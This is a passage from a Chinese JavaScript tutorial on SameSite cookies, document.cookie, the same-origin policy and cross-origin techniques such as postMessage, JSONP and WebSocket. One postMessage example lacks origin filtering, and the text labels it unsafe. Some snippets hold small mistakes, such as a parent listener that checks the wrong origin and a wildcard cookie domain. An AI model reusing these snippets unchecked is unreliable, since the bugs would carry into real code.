| AJAX      |            `$.get("...")`            | 发送 Cookie | 不发送      |
| Image     |          `<img src="...">`           | 发送 Cookie | 不发送      |

设置了`Strict`或`Lax`以后，基本就杜绝了 CSRF 攻击。当然，前提是用户浏览器支持 SameSite 属性。

**（3）None**

Chrome 计划将`Lax`变为默认设置。这时，网站可以选择显式关闭`SameSite`属性，将其设为`None`。不过，前提是必须同时设置`Secure`属性（Cookie 只能通过 HTTPS 协议发送），否则无效。

下面的设置无效。

```
Set-Cookie: widget_session=abc123; SameSite=None
```

下面的设置有效。

```
Set-Cookie: widget_session=abc123; SameSite=None; Secure
```

### document.cookie

`document.cookie`属性用于读写当前网页的 Cookie。

读取的时候，它会返回当前网页的所有 Cookie，前提是该 Cookie 不能有`HTTPOnly`属性。

```
document.cookie // "foo=bar;baz=bar"
```

上面代码从`document.cookie`一次性读出两个 Cookie，它们之间使用分号分隔。必须手动还原，才能取出每一个 Cookie 的值。

```
var cookies = document.cookie.split(';');

for (var i = 0; i < cookies.length; i++) {
  console.log(cookies[i]);
}
// foo=bar
// baz=bar
```

`document.cookie`属性是可写的，可以通过它为当前网站添加 Cookie。

```
document.cookie = 'fontSize=14';
```

写入的时候，Cookie 的值必须写成`key=value`的形式。注意，等号两边不能有空格。另外，写入 Cookie 的时候，必须对分号、逗号和空格进行转义（它们都不允许作为 Cookie 的值），这可以用`encodeURIComponent`方法达到。

但是，`document.cookie`一次只能写入一个 Cookie，而且写入并不是覆盖，而是添加。

```
document.cookie = 'test1=hello';
document.cookie = 'test2=world';
document.cookie
// test1=hello;test2=world
```

`document.cookie`读写行为的差异（一次可以读出全部 Cookie，但是只能写入一个 Cookie），与 HTTP 协议的 Cookie 通信格式有关。浏览器向服务器发送 Cookie 的时候，`Cookie`字段是使用一行将所有 Cookie 全部发送；服务器向浏览器设置 Cookie 的时候，`Set-Cookie`字段是一行设置一个 Cookie。

写入 Cookie 的时候，可以一起写入 Cookie 的属性。

```
document.cookie = "foo=bar; expires=Fri, 31 Dec 2020 23:59:59 GMT";
```

上面代码中，写入 Cookie 的时候，同时设置了`expires`属性。属性值的等号两边，也是不能有空格的。

各个属性的写入注意点如下。

- `path`属性必须为绝对路径，默认为当前路径。
- `domain`属性值必须是当前发送 Cookie 的域名的一部分。比如，当前域名是`example.com`，就不能将其设为`foo.com`。该属性默认为当前的一级域名（不含二级域名）。
- `max-age`属性的值为秒数。
- `expires`属性的值为 UTC 格式，可以使用`Date.prototype.toUTCString()`进行日期格式转换。

`document.cookie`写入 Cookie 的例子如下。

```
document.cookie = 'fontSize=14; '
  + 'expires=' + someDate.toGMTString() + '; '
  + 'path=/subdirectory; '
  + 'domain=*.example.com';
```

Cookie 的属性一旦设置完成，就没有办法读取这些属性的值。

删除一个现存 Cookie 的唯一方法，是设置它的`expires`属性为一个过去的日期。

```
document.cookie = 'fontSize=;expires=Thu, 01-Jan-1970 00:00:01 GMT';
```

上面代码中，名为`fontSize`的 Cookie 的值为空，过期时间设为1970年1月1月零点，就等同于删除了这个 Cookie。

## 同源限制

### 概述

#### 含义

1995年，同源政策由 Netscape 公司引入浏览器。目前，所有浏览器都实行这个政策。

最初，它的含义是指，A 网页设置的 Cookie，B 网页不能打开，除非这两个网页“同源”。所谓“同源”指的是“三个相同”。

> - 协议相同
> - 域名相同
> - 端口相同（这点可以忽略，详见下文）

举例来说，`http://www.example.com/dir/page.html`这个网址，协议是`http://`，域名是`www.example.com`，端口是`80`（默认端口可以省略），它的同源情况如下。

- `http://www.example.com/dir2/other.html`：同源
- `http://example.com/dir/other.html`：不同源（域名不同）
- `http://v2.www.example.com/dir/other.html`：不同源（域名不同）
- `http://www.example.com:81/dir/other.html`：不同源（端口不同）
- `https://www.example.com/dir/page.html`：不同源（协议不同）

注意，标准规定端口不同的网址不是同源（比如8000端口和8001端口不是同源），但是浏览器没有遵守这条规定。实际上，同一个网域的不同端口，是可以互相读取 Cookie 的。

#### 目的

同源政策的目的，是为了保证用户信息的安全，防止恶意的网站窃取数据。

设想这样一种情况：A 网站是一家银行，用户登录以后，A 网站在用户的机器上设置了一个 Cookie，包含了一些隐私信息。用户离开 A 网站以后，又去访问 B 网站，如果没有同源限制，B 网站可以读取 A 网站的 Cookie，那么隐私就泄漏了。更可怕的是，Cookie 往往用来保存用户的登录状态，如果用户没有退出登录，其他网站就可以冒充用户，为所欲为。因为浏览器同时还规定，提交表单不受同源政策的限制。

由此可见，同源政策是必需的，否则 Cookie 可以共享，互联网就毫无安全可言了。

#### 限制范围

随着互联网的发展，同源政策越来越严格。目前，如果非同源，共有三种行为受到限制。

> （1） 无法读取非同源网页的 Cookie、LocalStorage 和 IndexedDB。
>
> （2） 无法接触非同源网页的 DOM。
>
> （3） 无法向非同源地址发送 AJAX 请求（可以发送，但浏览器会拒绝接受响应）。

另外，通过 JavaScript 脚本可以拿到其他窗口的`window`对象。如果是非同源的网页，目前允许一个窗口可以接触其他网页的`window`对象的九个属性和四个方法。

- window.closed
- window.frames
- window.length
- window.location
- window.opener
- window.parent
- window.self
- window.top
- window.window
- window.blur()
- window.close()
- window.focus()
- window.postMessage()

上面的九个属性之中，只有`window.location`是可读写的，其他八个全部都是只读。而且，即使是`location`对象，非同源的情况下，也只允许调用`location.replace()`方法和写入`location.href`属性。

虽然这些限制是必要的，但是有时很不方便，合理的用途也受到影响。下面介绍如何规避上面的限制。

### Cookie

Cookie 是服务器写入浏览器的一小段信息，只有同源的网页才能共享。如果两个网页一级域名相同，只是次级域名不同，浏览器允许通过设置`document.domain`共享 Cookie。

举例来说，A 网页的网址是`http://w1.example.com/a.html`，B 网页的网址是`http://w2.example.com/b.html`，那么只要设置相同的`document.domain`，两个网页就可以共享 Cookie。因为浏览器通过`document.domain`属性来检查是否同源。

```js
// 两个网页都需要设置
document.domain = 'example.com';
```

注意，A 和 B 两个网页都需要设置`document.domain`属性，才能达到同源的目的。因为设置`document.domain`的同时，会把端口重置为`null`，因此如果只设置一个网页的`document.domain`，会导致两个网址的端口不同，还是达不到同源的目的。

现在，A 网页通过脚本设置一个 Cookie。

```js
document.cookie = "test1=hello";
```

B 网页就可以读到这个 Cookie。

```js
var allCookie = document.cookie;
```

注意，这种方法只适用于 Cookie 和 iframe 窗口，LocalStorage 和 IndexedDB 无法通过这种方法，规避同源政策，而要使用下文介绍 PostMessage API。

另外，服务器也可以在设置 Cookie 的时候，指定 Cookie 的所属域名为一级域名，比如`.example.com`。

```
Set-Cookie: key=value; domain=.example.com; path=/
```

这样的话，二级域名和三级域名不用做任何设置，都可以读取这个 Cookie。

### iframe 和多窗口通信

`iframe`元素可以在当前网页之中，嵌入其他网页。每个`iframe`元素形成自己的窗口，即有自己的`window`对象。`iframe`窗口之中的脚本，可以获得父窗口和子窗口。但是，只有在同源的情况下，父窗口和子窗口才能通信；如果跨域，就无法拿到对方的 DOM。

比如，父窗口运行下面的命令，如果`iframe`窗口不是同源，就会报错。

```js
document
.getElementById("myIFrame")
.contentWindow
.document
// Uncaught DOMException: Blocked a frame from accessing a cross-origin frame.
```

上面命令中，父窗口想获取子窗口的 DOM，因为跨域导致报错。

反之亦然，子窗口获取主窗口的 DOM 也会报错。

```js
window.parent.document.body
// 报错
```

这种情况不仅适用于`iframe`窗口，还适用于`window.open`方法打开的窗口，只要跨域，父窗口与子窗口之间就无法通信。

如果两个窗口一级域名相同，只是二级域名不同，那么设置上一节介绍的`document.domain`属性，就可以规避同源政策，拿到 DOM。

对于完全不同源的网站，目前有两种方法，可以解决跨域窗口的通信问题。

> - 片段识别符（fragment identifier）
> - 跨文档通信API（Cross-document messaging）

#### 片段识别符

片段标识符（fragment identifier）指的是，URL 的`#`号后面的部分，比如`http://example.com/x.html#fragment`的`#fragment`。如果只是改变片段标识符，页面不会重新刷新。

父窗口可以把信息，写入子窗口的片段标识符。

```js
var src = originURL + '#' + data;
document.getElementById('myIFrame').src = src;
```

上面代码中，父窗口把所要传递的信息，写入 iframe 窗口的片段标识符。

子窗口通过监听`hashchange`事件得到通知。

```js
window.onhashchange = checkMessage;

function checkMessage() {
  var message = window.location.hash;
  // ...
}
```

同样的，子窗口也可以改变父窗口的片段标识符。

```js
parent.location.href = target + '#' + hash;
```

#### window.postMessage()

上面的这种方法属于破解，HTML5 为了解决这个问题，引入了一个全新的API：跨文档通信 API（Cross-document messaging）。

这个 API 为`window`对象新增了一个`window.postMessage`方法，允许跨窗口通信，不论这两个窗口是否同源。举例来说，父窗口`aaa.com`向子窗口`bbb.com`发消息，调用`postMessage`方法就可以了。

```js
// 父窗口打开一个子窗口
var popup = window.open('http://bbb.com', 'title');
// 父窗口向子窗口发消息
popup.postMessage('Hello World!', 'http://bbb.com');
```

`postMessage`方法的第一个参数是具体的信息内容，第二个参数是接收消息的窗口的源（origin），即“协议 + 域名 + 端口”。也可以设为`*`，表示不限制域名，向所有窗口发送。

子窗口向父窗口发送消息的写法类似。

```js
// 子窗口向父窗口发消息
window.opener.postMessage('Nice to see you', 'http://aaa.com');
```

父窗口和子窗口都可以通过`message`事件，监听对方的消息。

```js
// 父窗口和子窗口都可以用下面的代码，
// 监听 message 消息
window.addEventListener('message', function (e) {
  console.log(e.data);
},false);
```

`message`事件的参数是事件对象`event`，提供以下三个属性。

> - `event.source`：发送消息的窗口
> - `event.origin`: 消息发向的网址
> - `event.data`: 消息内容

下面的例子是，子窗口通过`event.source`属性引用父窗口，然后发送消息。

```js
window.addEventListener('message', receiveMessage);
function receiveMessage(event) {
  event.source.postMessage('Nice to see you!', '*');
}
```

上面代码有几个地方需要注意。首先，`receiveMessage`函数里面没有过滤信息的来源，任意网址发来的信息都会被处理。其次，`postMessage`方法中指定的目标窗口的网址是一个星号，表示该信息可以向任意网址发送。通常来说，这两种做法是不推荐的，因为不够安全，可能会被恶意利用。

`event.origin`属性可以过滤不是发给本窗口的消息。

```js
window.addEventListener('message', receiveMessage);
function receiveMessage(event) {
  if (event.origin !== 'http://aaa.com') return;
  if (event.data === 'Hello World') {
    event.source.postMessage('Hello', event.origin);
  } else {
    console.log(event.data);
  }
}
```

#### LocalStorage

通过`window.postMessage`，读写其他窗口的 LocalStorage 也成为了可能。

下面是一个例子，主窗口写入 iframe 子窗口的`localStorage`。

```js
window.onmessage = function(e) {
  if (e.origin !== 'http://bbb.com') {
    return;
  }
  var payload = JSON.parse(e.data);
  localStorage.setItem(payload.key, JSON.stringify(payload.data));
};
```

上面代码中，子窗口将父窗口发来的消息，写入自己的 LocalStorage。

父窗口发送消息的代码如下。

```js
var win = document.getElementsByTagName('iframe')[0].contentWindow;
var obj = { name: 'Jack' };
win.postMessage(
  JSON.stringify({key: 'storage', data: obj}),
  'http://bbb.com'
);
```

加强版的子窗口接收消息的代码如下。

```js
window.onmessage = function(e) {
  if (e.origin !== 'http://bbb.com') return;
  var payload = JSON.parse(e.data);
  switch (payload.method) {
    case 'set':
      localStorage.setItem(payload.key, JSON.stringify(payload.data));
      break;
    case 'get':
      var parent = window.parent;
      var data = localStorage.getItem(payload.key);
      parent.postMessage(data, 'http://aaa.com');
      break;
    case 'remove':
      localStorage.removeItem(payload.key);
      break;
  }
};
```

加强版的父窗口发送消息代码如下。

```js
var win = document.getElementsByTagName('iframe')[0].contentWindow;
var obj = { name: 'Jack' };
// 存入对象
win.postMessage(
  JSON.stringify({key: 'storage', method: 'set', data: obj}),
  'http://bbb.com'
);
// 读取对象
win.postMessage(
  JSON.stringify({key: 'storage', method: "get"}),
  "*"
);
window.onmessage = function(e) {
  if (e.origin != 'http://aaa.com') return;
  console.log(JSON.parse(e.data).name);
};
```

### AJAX

同源政策规定，AJAX 请求只能发给同源的网址，否则就报错。

除了架设服务器代理（浏览器请求同源服务器，再由后者请求外部服务），有三种方法规避这个限制。

> - JSONP
> - WebSocket
> - CORS

#### JSONP

JSONP 是服务器与客户端跨源通信的常用方法。最大特点就是简单易用，没有兼容性问题，老式浏览器全部支持，服务端改造非常小。

它的做法如下。

第一步，网页添加一个`<script>`元素，向服务器请求一个脚本，这不受同源政策限制，可以跨域请求。

```html
<script src="http://api.foo.com?callback=bar"></script>
```

注意，请求的脚本网址有一个`callback`参数（`?callback=bar`），用来告诉服务器，客户端的回调函数名称（`bar`）。

第二步，服务器收到请求后，拼接一个字符串，将 JSON 数据放在函数名里面，作为字符串返回（`bar({...})`）。

第三步，客户端会将服务器返回的字符串，作为代码解析，因为浏览器认为，这是`<script>`标签请求的脚本内容。这时，客户端只要定义了`bar()`函数，就能在该函数体内，拿到服务器返回的 JSON 数据。

下面看一个实例。首先，网页动态插入`<script>`元素，由它向跨域网址发出请求。

```
function addScriptTag(src) {
  var script = document.createElement('script');
  script.setAttribute('type', 'text/javascript');
  script.src = src;
  document.body.appendChild(script);
}

window.onload = function () {
  addScriptTag('http://example.com/ip?callback=foo');
}

function foo(data) {
  console.log('Your public IP address is: ' + data.ip);
};
```

上面代码通过动态添加`<script>`元素，向服务器`example.com`发出请求。注意，该请求的查询字符串有一个`callback`参数，用来指定回调函数的名字，这对于 JSONP 是必需的。

服务器收到这个请求以后，会将数据放在回调函数的参数位置返回。

```js
foo({
  'ip': '8.8.8.8'
});
```

由于`<script>`元素请求的脚本，直接作为代码运行。这时，只要浏览器定义了`foo`函数，该函数就会立即调用。作为参数的 JSON 数据被视为 JavaScript 对象，而不是字符串，因此避免了使用`JSON.parse`的步骤。

#### WebSocket

WebSocket 是一种通信协议，使用`ws://`（非加密）和`wss://`（加密）作为协议前缀。该协议不实行同源政策，只要服务器支持，就可以通过它进行跨源通信。

下面是一个例子，浏览器发出的 WebSocket 请求的头信息（摘自[维基百科](https://en.wikipedia.org/wiki/WebSocket)）。

```
GET /chat HTTP/1.1
Host: server.example.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: x3JJHMbDL1EzLkh9GBhXDw==
Sec-WebSocket-Protocol: chat, superchat
Sec-WebSocket-Version: 13
Origin: http://example.com
```

上面代码中，有一个字段是`Origin`，表示该请求的请求源（origin），即发自哪个域名。

正是因为有了`Origin`这个字段，所以 WebSocket 才没有实行同源政策。因为服务器可以根据这个字段，判断是否许可本次通信。如果该域名在白名单内，服务器就会做出如下回应。

```js
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: HSmrc0sMlYUkAGmm5OPpG2HaGWk=
Sec-WebSocket-Protocol: chat
```

#### CORS

CORS 是跨源资源分享（Cross-Origin Resource Sharing）的缩写。它是 W3C 标准，属于跨源 AJAX 请求的根本解决方法。相比 JSONP 只能发`GET`请求，CORS 允许任何类型的请求。
